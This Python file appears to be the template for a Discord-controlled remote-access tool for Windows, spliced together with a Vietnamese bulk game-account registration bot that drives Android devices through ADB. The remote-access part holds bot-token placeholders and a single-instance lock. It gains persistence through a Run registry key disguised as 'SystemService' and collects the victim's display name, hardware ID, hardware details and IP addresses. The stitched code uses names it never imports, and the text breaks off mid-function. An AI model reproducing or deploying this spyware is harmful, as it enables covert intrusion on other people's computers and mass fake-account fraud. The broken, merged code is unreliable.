# Disclaimer: This is only for entertainment and educational purposes.  
# I am not responsible for what you do with it or any consequences.  
# Made by Vexi :3 + HHH Integration

import os
import discord
from discord.ext import commands
import asyncio
import sys
import subprocess
import time
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import random
import string
import ctypes
import threading
import pyttsx3
import platform
import uuid
import socket
import re
import requests
import winreg
import base64
import atexit
import json
import importlib
from pathlib import Path
from tkinter import filedialog, messagebox, ttk
from tkinter.scrolledtext import ScrolledText
import tkinter as tk
import queue
import argparse

if platform.system() != "Windows":
    sys.exit(0)

dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)

open(lock, "w").close()

running = True

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)

atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

current_pid = os.getpid()
current_script = os.path.basename(__file__).lower()

class Config:
    TOKEN = "{placeholder_token}" 
    WHITELISTED = [{placeholder_whitelist}] # type: ignore
    MAIN_CHANNEL = {placeholder_main_channel} # type: ignore
    PREFIX = "{placeholder_prefix}"
    STARTUP = {placeholder_add_to_startup} # type: ignore

intents = discord.Intents.default()
intents.message_content = True

config = Config()
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

# ========== HHH MODULE INTEGRATION ==========
APP_VERSION = "v1.0.0"

THEME = {
    "bg": "#07111f",
    "panel": "#0d1b2e",
    "panel_alt": "#11243a",
    "panel_soft": "#152b45",
    "line": "#254563",
    "text": "#e9f7ff",
    "muted": "#8fa9c4",
    "cyan": "#22d3ee",
    "purple": "#a855f7",
    "green": "#39ff88",
    "yellow": "#facc15",
    "red": "#fb7185",
    "button": "#7c3aed",
    "button_hover": "#8b5cf6",
}

BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "data"
TEMPLATE_DIR = DATA_DIR / "templates"
LOG_DIR = DATA_DIR / "logs"
CONFIG_PATH = DATA_DIR / "config.json"
TEMPLATE_METADATA_PATH = TEMPLATE_DIR / "templates.json"
REGISTRY_ROOT = r"Software\HHHImageLoginTool\Templates"

IMAGE_TEMPLATE_ROLES: dict[str, str] = {
    "create_account_icon": "Biểu tượng tạo tài khoản",
    "account_type": "Loại tài khoản đăng kí",
    "email_field": "Ô nhập email",
    "agree_one": "Ô đồng ý thứ nhất",
    "agree_two": "Ô đồng ý thứ hai",
    "continue_email": "Nút tiếp tục sau email",
    "agree_extra": "Ô đồng ý bổ sung",
    "continue_confirm": "Nút tiếp tục sau xác nhận",
    "username_field": "Ô nhập username",
    "password_field": "Ô nhập password",
    "continue_credentials": "Nút tiếp tục sau username/password",
    "name_field": "Ô nhập tên",
    "phone_field": "Ô nhập số điện thoại",
    "birthday_field": "Ô chọn ngày sinh",
    "birthday_confirm": "Ô xác nhận sau ngày sinh",
    "final_button": "Nút hoàn tất",
}

ROLE_BUTTON_TEXT: dict[str, str] = {role: "Chọn mốc" for role in IMAGE_TEMPLATE_ROLES}

LOG_FILTERS: dict[str, str] = {
    "all": "Tất cả",
    "success": "Thành công",
    "warning": "Cảnh báo",
    "error": "Lỗi",
}

REGISTRATION_WORKFLOW: list[tuple[str, str, str]] = [
    ("create_account", "Tạo tài khoản", "Không tìm thấy biểu tượng tạo tài khoản."),
    ("select_type", "Chọn loại tài khoản", "Không tìm thấy lựa chọn loại tài khoản."),
    ("email_terms", "Nhập email", "Không hoàn tất được bước email và điều khoản."),
    ("extra_confirm", "Xác nhận bổ sung", "Không hoàn tất được bước xác nhận bổ sung."),
    ("credentials", "Username & mật khẩu", "Không nhập được username hoặc mật khẩu."),
    ("personal_info", "Thông tin cá nhân", "Không hoàn tất được thông tin cá nhân."),
]

RESULT_PATH = LOG_DIR / "register_results.txt"

IMAGE_MATCH_SCALES = (0.9, 0.95, 1.0, 1.05, 1.1)
IMAGE_MATCH_DEFAULT_THRESHOLD = 0.85

DEFAULT_CONFIG: dict[str, Any] = {
    "adb_path": "adb",
    "threshold": IMAGE_MATCH_DEFAULT_THRESHOLD,
    "match_timeout": 15.0,
    "login_disappear_timeout": 25.0,
    "poll_interval": 1.0,
    "prefer_scanned_coordinates": True,
    "clear_before_type": True,
    "clear_keypresses": 80,
    "retry_attempts": 2,
    "default_phone": "0123456789",
    "default_birthday": "01/01/1990",
    "delay_after_tap": 0.35,
    "delay_after_text": 0.35,
    "delay_after_login": 1.0,
}

class AppError(RuntimeError):
    pass

def friendly_error(error: Exception | str) -> str:
    message = str(error)
    lowered = message.lower()
    if "could not find" in lowered or "best score" in lowered:
        return "Không tìm thấy mốc thao tác trên màn hình. Hãy chọn lại mốc hoặc giảm độ nhạy."
    if "missing template" in lowered or "template not loaded" in lowered:
        return "Bạn cần chọn đủ các mốc thao tác trước khi chạy."
    if "login screen did not appear" in lowered:
        return "Chưa thấy màn hình đăng kí trong thời gian chờ."
    if "login screen still visible" in lowered:
        return "Chưa thấy màn hình hoàn tất sau khi xác nhận đăng kí."
    if "registration screen did not appear" in lowered:
        return "Chưa thấy màn hình đăng kí trong thời gian chờ."
    if "completion screen did not appear" in lowered:
        return "Chưa thấy màn hình hoàn tất sau khi xác nhận đăng kí."
    if "executable not found" in lowered:
        return "Chưa tìm thấy bộ kết nối thiết bị. Hãy kiểm tra cài đặt kết nối trên máy."
    if "timed out" in lowered:
        return "Thiết bị phản hồi quá lâu. Hãy kiểm tra kết nối rồi thử lại."
    if "devices" in lowered or "screencap" in lowered:
        return "Chưa tìm thấy thiết bị. Hãy cắm thiết bị và bấm Tìm thiết bị."
    if "threshold" in lowered:
        return "Độ nhạy nhận diện chưa hợp lệ. Hãy chọn giá trị từ 1% đến 100%."
    replacements = {
        "OpenCV": "Tự động theo màn hình",
        "opencv": "tự động theo màn hình",
        "ADB": "kết nối thiết bị",
        "adb": "kết nối thiết bị",
        "template": "mốc thao tác",
        "Template": "Mốc thao tác",
        "threshold": "độ nhạy nhận diện",
        "screenshot": "ảnh màn hình",
        "Screenshot": "Ảnh màn hình",
        "shell": "kết nối",
        "command": "tác vụ",
    }
    for old, new in replacements.items():
        message = message.replace(old, new)
    return message

def now_text() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def ensure_dirs() -> None:
    TEMPLATE_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)

def append_log_file(line: str) -> None:
    ensure_dirs()
    path = LOG_DIR / "tool.log"
    with path.open("a", encoding="utf-8") as f:
        f.write(line.rstrip() + "\n")

def install_if_missing(import_name: str, package_name: str | None = None) -> Any:
    try:
        return importlib.import_module(import_name)
    except ImportError:
        package = package_name or import_name
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        return importlib.import_module(import_name)

def ensure_image_libraries() -> tuple[Any, Any]:
    cv2 = install_if_missing("cv2", "opencv-python")
    np = install_if_missing("numpy")
    return cv2, np

def ensure_pillow_libraries() -> tuple[Any, Any]:
    image = install_if_missing("PIL.Image", "Pillow")
    image_tk = install_if_missing("PIL.ImageTk", "Pillow")
    return image, image_tk

def load_config() -> dict[str, Any]:
    ensure_dirs()
    if not CONFIG_PATH.exists():
        return dict(DEFAULT_CONFIG)
    try:
        data = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
    except Exception:
        return dict(DEFAULT_CONFIG)
    config = dict(DEFAULT_CONFIG)
    if isinstance(data, dict):
        config.update(data)
    return config

def save_config(config: dict[str, Any]) -> None:
    ensure_dirs()
    CONFIG_PATH.write_text(
        json.dumps(config, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )

def creation_flags() -> int:
    if os.name == "nt":
        return 0x08000000
    return 0

def run_adb_command(
    adb_path: str,
    args: list[str],
    timeout: float = 15,
    binary: bool = False,
) -> subprocess.CompletedProcess[Any]:
    cmd = [adb_path, *args]
    kwargs: dict[str, Any] = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "timeout": timeout,
        "creationflags": creation_flags(),
    }
    try:
        if binary:
            return subprocess.run(cmd, **kwargs)
        kwargs.update({"text": True, "encoding": "utf-8", "errors": "replace"})
        return subprocess.run(cmd, **kwargs)
    except FileNotFoundError as exc:
        raise AppError(f"ADB executable not found: {adb_path}") from exc
    except subprocess.TimeoutExpired as exc:
        raise AppError(f"ADB command timed out after {timeout} seconds: {' '.join(cmd)}") from exc

def device_adb_args(device: str | None, args: list[str]) -> list[str]:
    if device:
        return ["-s", device, *args]
    return args

def require_success(result: subprocess.CompletedProcess[Any], action: str) -> None:
    if result.returncode == 0:
        return
    stderr = result.stderr
    if isinstance(stderr, bytes):
        stderr = stderr.decode("utf-8", errors="replace")
    stdout = result.stdout
    if isinstance(stdout, bytes):
        stdout = stdout.decode("utf-8", errors="replace")
    detail = (stderr or stdout or "").strip()
    if detail:
        raise AppError(f"{action} failed: {detail}")
    raise AppError(f"{action} failed with exit code {result.returncode}")

def list_adb_devices(adb_path: str) -> list[dict[str, str]]:
    result = run_adb_command(adb_path, ["devices"], timeout=10)
    require_success(result, "adb devices")
    devices: list[dict[str, str]] = []
    for line in result.stdout.splitlines()[1:]:
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) >= 2:
            devices.append({"serial": parts[0], "status": parts[1]})
    return devices

def adb_tap(adb_path: str, device: str, x: int, y: int) -> None:
    result = run_adb_command(
        adb_path,
        device_adb_args(device, ["shell", "input", "tap", str(x), str(y)]),
        timeout=10,
    )
    require_success(result, f"tap {x},{y}")

def android_single_quote(value: str) -> str:
    return "'" + value.replace("'", "'\\''") + "'"

def adb_input_text(adb_path: str, device: str, text: str) -> None:
    prepared = text.replace(" ", "%s")
    result = run_adb_command(
        adb_path,
        device_adb_args(device, ["shell", "input", "text", android_single_quote(prepared)]),
        timeout=max(10, min(60, len(text) / 4 + 10)),
    )
    require_success(result, "input text")

def adb_keyevent(adb_path: str, device: str, keycodes: list[str], timeout: float = 10) -> None:
    result = run_adb_command(
        adb_path,
        device_adb_args(device, ["shell", "input", "keyevent", *keycodes]),
        timeout=timeout,
    )
    require_success(result, "keyevent")

def adb_clear_text(adb_path: str, device: str, keypresses: int) -> None:
    if keypresses <= 0:
        return
    adb_keyevent(adb_path, device, ["123"], timeout=10)
    remaining = keypresses
    while remaining > 0:
        chunk = min(remaining, 40)
        adb_keyevent(adb_path, device, ["67"] * chunk, timeout=15)
        remaining -= chunk

def adb_screenshot_image(adb_path: str, device: str) -> Any:
    cv2, np = ensure_image_libraries()
    result = run_adb_command(
        adb_path,
        device_adb_args(device, ["exec-out", "screencap", "-p"]),
        timeout=15,
        binary=True,
    )
    require_success(result, "screencap")
    if not result.stdout:
        raise AppError("ADB did not return screenshot data")
    data = np.frombuffer(result.stdout, dtype=np.uint8)
    image = cv2.imdecode(data, cv2.IMREAD_COLOR)
    if image is None:
        raise AppError("Could not decode screenshot data as an image")
    return image

def load_image_file(image_path: Path) -> Any:
    cv2, np = ensure_image_libraries()
    if not image_path.exists():
        raise AppError(f"Image file not found: {image_path}")
    data = np.fromfile(str(image_path), dtype=np.uint8)
    if data.size == 0:
        raise AppError(f"Image file is empty: {image_path}")
    image = cv2.imdecode(data, cv2.IMREAD_COLOR)
    if image is None:
        raise AppError(f"Could not decode image file: {image_path}")
    return image

def save_image_file(image_path: Path, image: Any) -> Path:
    cv2, _np = ensure_image_libraries()
    image_path.parent.mkdir(parents=True, exist_ok=True)
    ok, encoded = cv2.imencode(".png", image)
    if not ok:
        raise AppError(f"Could not encode image: {image_path}")
    encoded.tofile(str(image_path))
    return image_path

def encode_image_template_data(image: Any) -> str:
    cv2, _np = ensure_image_libraries()
    ok, encoded = cv2.imencode(".png", image)
    if not ok:
        raise AppError("Could not encode template image")
    return base64.b64encode(encoded.tobytes()).decode("ascii")

def decode_image_template_data(data: str) -> Any:
    cv2, np = ensure_image_libraries()
    raw = base64.b64decode(data.encode("ascii"))
    arr = np.frombuffer(raw, dtype=np.uint8)
    image = cv2.imdecode(arr, cv2.IMREAD_COLOR)
    if image is None:
        raise AppError("Could not decode template image from metadata")
    return image

class TemplateStore:
    def __init__(self, template_dir: Path = TEMPLATE_DIR) -> None:
        self.template_dir = template_dir
        self.metadata_path = template_dir / "templates.json"
        self.template_dir.mkdir(parents=True, exist_ok=True)
        self.metadata = self._load_metadata()

    def _load_metadata(self) -> dict[str, Any]:
        if not self.metadata_path.exists():
            return {}
        try:
            data = json.loads(self.metadata_path.read_text(encoding="utf-8"))
        except Exception:
            return {}
        return data if isinstance(data, dict) else {}

    def save_metadata(self) -> None:
        self.template_dir.mkdir(parents=True, exist_ok=True)
        self.metadata_path.write_text(
            json.dumps(self.metadata, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )

    def template_path(self, role: str) -> Path:
        return self.template_dir / f"{role}.png"

    def save_entry(
        self,
        role: str,
        image: Any,
        screen_size: list[int] | None = None,
        rect: list[int] | None = None,
        center: list[int] | None = None,
        source: str = "scanner",
    ) -> dict[str, Any]:
        if role not in IMAGE_TEMPLATE_ROLES:
            raise AppError(f"Unknown template role: {role}")
        path = self.template_path(role)
        save_image_file(path, image)
        entry = {
            "role": role,
            "label": IMAGE_TEMPLATE_ROLES[role],
            "file": path.name,
            "screen_size": screen_size,
            "rect": rect,
            "center": center,
            "source": source,
            "updated_at": now_text(),
            "image_data": encode_image_template_data(image),
        }
        self.metadata[role] = entry
        self.save_metadata()
        self._save_registry_entry(role, entry)
        return entry

    def load_template_source(self, role: str) -> tuple[Any, dict[str, Any]]:
        entry = self.metadata.get(role)
        if isinstance(entry, dict):
            image_data = entry.get("image_data")
            if isinstance(image_data, str) and image_data:
                try:
                    return decode_image_template_data(image_data), entry
                except Exception:
                    pass
            image_file = entry.get("file") or f"{role}.png"
            path = self.template_dir / image_file
            if path.exists():
                return load_image_file(path), entry
        registry_entry = self._load_registry_entry(role)
        if registry_entry:
            image_data = registry_entry.get("image_data")
            if isinstance(image_data, str) and image_data:
                return decode_image_template_data(image_data), registry_entry
        fallback = self.template_path(role)
        if fallback.exists():
            return load_image_file(fallback), {
                "role": role,
                "label": IMAGE_TEMPLATE_ROLES.get(role, role),
                "file": fallback.name,
                "updated_at": None,
            }
        raise AppError(f"Missing template: {role} ({IMAGE_TEMPLATE_ROLES.get(role, role)})")

    def load_all(self, required: bool = False) -> tuple[dict[str, Any], dict[str, Any]]:
        templates: dict[str, Any] = {}
        metadata: dict[str, Any] = {}
        errors: list[str] = []
        for role in IMAGE_TEMPLATE_ROLES:
            try:
                image, entry = self.load_template_source(role)
                templates[role] = image
                metadata[role] = entry
            except Exception as exc:
                errors.append(str(exc))
        if required and errors:
            raise AppError("\n".join(errors))
        return templates, metadata

    def _save_registry_entry(self, role: str, entry: dict[str, Any]) -> None:
        if os.name != "nt":
            return
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REGISTRY_ROOT)
            try:
                winreg.SetValueEx(
                    key,
                    role,
                    0,
                    winreg.REG_SZ,
                    json.dumps(entry, ensure_ascii=False),
                )
            finally:
                winreg.CloseKey(key)
        except Exception:
            return

    def _load_registry_entry(self, role: str) -> dict[str, Any] | None:
        if os.name != "nt":
            return None
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_ROOT)
            try:
                value, _value_type = winreg.QueryValueEx(key, role)
            finally:
                winreg.CloseKey(key)
            data = json.loads(value)
            return data if isinstance(data, dict) else None
        except Exception:
            return None

def find_template_match(screen: Any, template: Any, threshold: float) -> dict[str, Any] | None:
    cv2, _np = ensure_image_libraries()
    if screen is None or template is None:
        return None
    if len(screen.shape) < 2 or len(template.shape) < 2:
        return None
    screen_h, screen_w = screen.shape[:2]
    template_h, template_w = template.shape[:2]
    if screen_h <= 0 or screen_w <= 0 or template_h <= 0 or template_w <= 0:
        return None
    screen_gray = cv2.cvtColor(screen, cv2.COLOR_BGR2GRAY)
    best_match: dict[str, Any] | None = None
    for scale in IMAGE_MATCH_SCALES:
        width = int(round(template_w * scale))
        height = int(round(template_h * scale))
        if width <= 0 or height <= 0:
            continue
        if height > screen_h or width > screen_w:
            continue
        if scale == 1.0:
            scaled_template = template
        else:
            interpolation = cv2.INTER_AREA if scale < 1.0 else cv2.INTER_CUBIC
            scaled_template = cv2.resize(template, (width, height), interpolation=interpolation)
        template_gray = cv2.cvtColor(scaled_template, cv2.COLOR_BGR2GRAY)
        result = cv2.matchTemplate(screen_gray, template_gray, cv2.TM_CCOEFF_NORMED)
        _min_value, max_value, _min_location, max_location = cv2.minMaxLoc(result)
        match = {
            "score": float(max_value),
            "x": int(max_location[0] + width // 2),
            "y": int(max_location[1] + height // 2),
            "left": int(max_location[0]),
            "top": int(max_location[1]),
            "width": int(width),
            "height": int(height),
            "scale": float(scale),
        }
        if best_match is None or match["score"] > best_match["score"]:
            best_match = match
    if not best_match or best_match["score"] < threshold:
        return None
    return best_match

def wait_for_template_match(
    adb_path: str,
    device: str,
    template: Any,
    threshold: float,
    timeout_seconds: float,
    stop_event: threading.Event,
    poll_interval: float = 1.0,
) -> tuple[dict[str, Any] | None, float]:
    start = time.time()
    best_score = 0.0
    while time.time() - start < timeout_seconds:
        if stop_event.is_set():
            return None, best_score
        screen = adb_screenshot_image(adb_path, device)
        match = find_template_match(screen, template, threshold)
        if match:
            return match, float(match["score"])
        weak_match = find_template_match(screen, template, 0.0)
        if weak_match:
            best_score = max(best_score, float(weak_match["score"]))
        time.sleep(max(0.1, poll_interval))
    return None, best_score

@dataclass(frozen=True)
class Account:
    email: str
    username: str
    password: str
    display_name: str = ""

    def to_line(self) -> str:
        return f"{self.username}|{self.password}|{self.email}|{self.display_name}"

def parse_accounts(text: str) -> list[Account]:
    accounts: list[Account] = []
    for number, raw_line in enumerate(text.splitlines(), start=1):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        delimiter = None
        for candidate in ("|", "\t", ",", ":"):
            if candidate in line:
                delimiter = candidate
                break
        if delimiter is None:
            raise AppError(f"Dòng {number} chưa đúng định dạng. Dùng: username|pass|email|tên.")
        parts = [part.strip() for part in line.split(delimiter)]
        if len(parts) < 3 or not parts[0] or not parts[1] or not parts[2]:
            raise AppError(f"Dòng {number} chưa đủ username, pass và email.")
        display_name = parts[3] if len(parts) >= 4 and parts[3] else f"AOVUser{number:04d}"
        accounts.append(Account(username=parts[0], password=parts[1], email=parts[2], display_name=display_name))
    return accounts

class ImageLoginRunner:
    def __init__(
        self,
        adb_path: str,
        devices: list[str],
        accounts: list[Account],
        templates: dict[str, Any],
        metadata: dict[str, Any],
        config: dict[str, Any],
        stop_event: threading.Event,
        log: Callable[[str], None],
        account_done: Callable[[Account], None] | None = None,
        account_failed: Callable[[Account, Exception], None] | None = None,
        workflow_update: Callable[[str, str, str | None], None] | None = None,
        current_account_update: Callable[[Account | None], None] | None = None,
        pause_event: threading.Event | None = None,
        stop_after_current_event: threading.Event | None = None,
        device_labels: dict[str, str] | None = None,
    ) -> None:
        self.adb_path = adb_path
        self.devices = devices
        self.accounts = accounts
        self.templates = templates
        self.metadata = metadata
        self.config = config
        self.stop_event = stop_event
        self.pause_event = pause_event or threading.Event()
        self.stop_after_current_event = stop_after_current_event or threading.Event()
        self.log = log
        self.account_done = account_done
        self.account_failed = account_failed
        self.workflow_update = workflow_update
        self.current_account_update = current_account_update
        self.device_labels = device_labels or {}
        self.account_lock = threading.Lock()
        self.used_accounts: list[Account] = []
        self.error: Exception | None = None

    def run(self) -> None:
        threads: list[threading.Thread] = []
        for device in self.devices:
            thread = threading.Thread(
                target=self._run_device_guarded,
                args=(device,),
                daemon=True,
                name=f"runner-{device}",
            )
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        if self.error:
            raise self.error

    def _run_device_guarded(self, device: str) -> None:
        try:
            self.run_device_loop(device)
        except Exception as exc:
            self.error = exc
            self.stop_event.set()
            self.log(f"{self.device_name(device)} gặp lỗi: {friendly_error(exc)}")

    def device_name(self, device: str) -> str:
        return self.device_labels.get(device, "Thiết bị")

    def workflow_step(self, key: str, status: str = "active", hint: str | None = None) -> None:
        if self.workflow_update:
            self.workflow_update(key, status, hint)

    def wait_if_paused(self) -> None:
        while self.pause_event.is_set() and not self.stop_event.is_set():
            time.sleep(0.2)

    def get_next_account(self) -> Account | None:
        if self.stop_after_current_event.is_set() or self.stop_event.is_set():
            return None
        with self.account_lock:
            if not self.accounts:
                return None
            return self.accounts.pop(0)

    def mark_account_done(self, account: Account) -> None:
        with self.account_lock:
            self.used_accounts.append(account)
        if self.account_done:
            self.account_done(account)

    def run_device_loop(self, device: str) -> None:
        label = self.device_name(device)
        self.log(f"{label} bắt đầu quy trình đăng kí.")
        while not self.stop_event.is_set():
            self.wait_if_paused()
            account = self.get_next_account()
            if account is None:
                self.log(f"{label} đã xử lý xong danh sách hiện có.")
                if self.current_account_update:
                    self.current_account_update(None)
                return
            if self.current_account_update:
                self.current_account_update(account)
            try:
                self.process_registration_account(device, account)
            except Exception as exc:
                if self.account_failed:
                    self.account_failed(account, exc)
                raise

    def process_registration_account(self, device: str, account: Account) -> None:
        label = self.device_name(device)
        phone = str(self.config.get("default_phone", "0123456789"))
        self.workflow_step("create_account", "active")
        self.log(f"{label} chuẩn bị đăng kí tài khoản {account.username}.")
        self.tap_action_point(device, "create_account_icon")
        self.after_tap_delay()
        self.workflow_step("create_account", "done")
        self.workflow_step("select_type", "active")
        self.tap_action_point(device, "account_type")
        self.after_tap_delay()
        self.workflow_step("select_type", "done")
        self.workflow_step("email_terms", "active")
        self.tap_action_point(device, "email_field")
        self.after_tap_delay()
        if self.config.get("clear_before_type", True):
            adb_clear_text(self.adb_path, device, int(self.config.get("clear_keypresses", 80)))
        adb_input_text(self.adb_path, device, account.email)
        self.after_text_delay()
        self.tap_action_point(device, "agree_one")
        self.after_tap_delay()
        self.tap_action_point(device, "agree_two")
        self.after_tap_delay()
        self.tap_action_point(device, "continue_email")
        self.after_tap_delay()
        self.workflow_step("email_terms", "done")
        self.workflow_step("extra_confirm", "active")
        self.tap_action_point(device, "agree_extra")
        self.after_tap_delay()
        self.tap_action_point(device, "continue_confirm")
        self.after_tap_delay()
        self.workflow_step("extra_confirm", "done")
        self.workflow_step("credentials", "active")
        self.tap_action_point(device, "username_field")
        self.after_tap_delay()
        if self.config.get("clear_before_type", True):
            adb_clear_text(self.adb_path, device, int(self.config.get("clear_keypresses", 80)))
        adb_input_text(self.adb_path, device, account.username)
        self.after_text_delay()
        self.tap_action_point(device, "password_field")
        self.after_tap_delay()
        self.log(f"{label} đã xử lý bước xác nhận sau username.")
        self.tap_action_point(device, "password_field")
        self.after_tap_delay()
        if self.config.get("clear_before_type", True):
            adb_clear_text(self.adb_path, device, int(self.config.get("clear_keypresses", 80)))
        adb_input_text(self.adb_path, device, account.password)
        self.after_text_delay()
        self.tap_action_point(device, "continue_credentials")
        self.after_tap_delay()
        self.workflow_step("credentials", "done")
        self.workflow_step("personal_info", "active")
        self.tap_action_point(device, "name_field")
        self.after_tap_delay()
        if self.config.get("clear_before_type", True):
            adb_clear_text(self.adb_path, device, int(self.config.get("clear_keypresses", 80)))
        adb_input_text(self.adb_path, device, account.display_name or "AOVUser")
        self.after_text_delay()
        self.tap_action_point(device, "phone_field")
        self.after_tap_delay()
        if self.config.get("clear_before_type", True):
            adb_clear_text(self.adb_path, device, int(self.config.get("clear_keypresses", 80)))
        adb_input_text(self.adb_path, device, phone)
        self.after_text_delay()
        self.tap_action_point(device, "birthday_field")
        self.after_tap_delay()
        self.tap_action_point(device, "birthday_confirm")
        self.after_tap_delay()
        self.tap_action_point(device, "final_button")
        self.after_tap_delay()
        self.workflow_step("personal_info", "done")
        self.mark_account_done(account)
        self.log(f"{label} đăng kí thành công tài khoản {account.username}.")

    def threshold(self) -> float:
        return float(self.config.get("threshold", IMAGE_MATCH_DEFAULT_THRESHOLD))

    def match_timeout(self) -> float:
        return float(self.config.get("match_timeout", 15.0))

    def retry_attempts(self) -> int:
        return max(0, int(self.config.get("retry_attempts", 2)))

    def poll_interval(self) -> float:
        return float(self.config.get("poll_interval", 1.0))

    def after_tap_delay(self) -> None:
        time.sleep(float(self.config.get("delay_after_tap", 0.35)))

    def after_text_delay(self) -> None:
        time.sleep(float(self.config.get("delay_after_text", 0.35)))

    def wait_for_role(self, device: str, role: str) -> bool:
        template = self.templates.get(role)
        if template is None:
            raise AppError(f"Template not loaded: {role}")
        match, _best_score = wait_for_template_match(
            self.adb_path,
            device,
            template,
            self.threshold(),
            self.match_timeout(),
            self.stop_event,
            self.poll_interval(),
        )
        return bool(match)

    def tap_scanned_coordinate(self, device: str, role: str) -> bool:
        entry = self.metadata.get(role) or {}
        center = entry.get("center")
        saved_size = entry.get("screen_size")
        if not center or not saved_size:
            return False
        try:
            saved_w, saved_h = int(saved_size[0]), int(saved_size[1])
            center_x, center_y = float(center[0]), float(center[1])
        except Exception:
            return False
        if saved_w <= 0 or saved_h <= 0:
            return False
        screen = adb_screenshot_image(self.adb_path, device)
        current_h, current_w = screen.shape[:2]
        x = int(round(center_x * current_w / saved_w))
        y = int(round(center_y * current_h / saved_h))
        adb_tap(self.adb_path, device, x, y)
        self.log(f"{self.device_name(device)} đã chọn {IMAGE_TEMPLATE_ROLES.get(role, role)}.")
        return True

    def tap_action_point(self, device: str, role: str) -> None:
        if self.config.get("prefer_scanned_coordinates", True):
            if self.tap_scanned_coordinate(device, role):
                return
        template = self.templates.get(role)
        if template is None:
            raise AppError(f"Template not loaded: {role}")
        best_score = 0.0
        for _attempt in range(self.retry_attempts() + 1):
            self.wait_if_paused()
            match, best_score = wait_for_template_match(
                self.adb_path,
                device,
                template,
                self.threshold(),
                self.match_timeout(),
                self.stop_event,
                self.poll_interval(),
            )
            if match:
                adb_tap(self.adb_path, device, int(match["x"]), int(match["y"]))
                self.log(
                    f"{self.device_name(device)} đã chọn {IMAGE_TEMPLATE_ROLES.get(role, role)} "
                    f"với độ tin cậy {int(match['score'] * 100)}%."
                )
                return
        raise AppError(
            "Could not find target; "
            f"best score {best_score:.3f}, threshold {self.threshold():.3f}"
        )

def test_templates_on_device(
    adb_path: str,
    device: str,
    templates: dict[str, Any],
    threshold: float,
) -> list[dict[str, Any]]:
    screen = adb_screenshot_image(adb_path, device)
    rows: list[dict[str, Any]] = []
    for role in IMAGE_TEMPLATE_ROLES:
        template = templates.get(role)
        if template is None:
            rows.append({"role": role, "found": False, "score": 0.0, "message": "missing"})
            continue
        weak = find_template_match(screen, template, 0.0)
        found = weak is not None and weak["score"] >= threshold
        rows.append(
            {
                "role": role,
                "found": found,
                "score": float(weak["score"]) if weak else 0.0,
                "x": weak.get("x") if weak else None,
                "y": weak.get("y") if weak else None,
                "scale": weak.get("scale") if weak else None,
                "message": "ok" if found else "below threshold",
            }
        )
    return rows

def elapsed_text(started_at: float | None) -> str:
    if not started_at:
        return "00:00:00"
    seconds = max(0, int(time.time() - started_at))
    hours, rem = divmod(seconds, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def safe_percent(value: float) -> int:
    return max(0, min(100, int(round(value * 100))))

def add_to_startup():
    try:
        app_path = sys.executable
        app_name = os.path.basename(app_path)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

def get_displayname():
    try:
        if platform.system() == "Windows":
            import ctypes
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3
            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)
            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)
            return nameBuffer.value
    except:
        pass
    return platform.node()

def get_hwid():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
            result = subprocess.check_output(cmd, shell=True).decode().strip()
            if result:
                return result
        return str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
            cpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if cpu:
                return cpu
        return platform.processor() or "N/A"
    except:
        try:
            return platform.processor() or "N/A"
        except:
            return "N/A"

def get_gpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
            gpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if gpu:
                return gpu.split('\n')[0]
            return "N/A"
        else:
            return "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({
                'drive': partition.device,
                'free': f"{usage.free / (1024**3):.2f}",
                'total': f"{usage.total / (1024**3):.2f}",
                'percent': usage.percent
            })
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        apis = [
            'https://ipapi.co/json/',
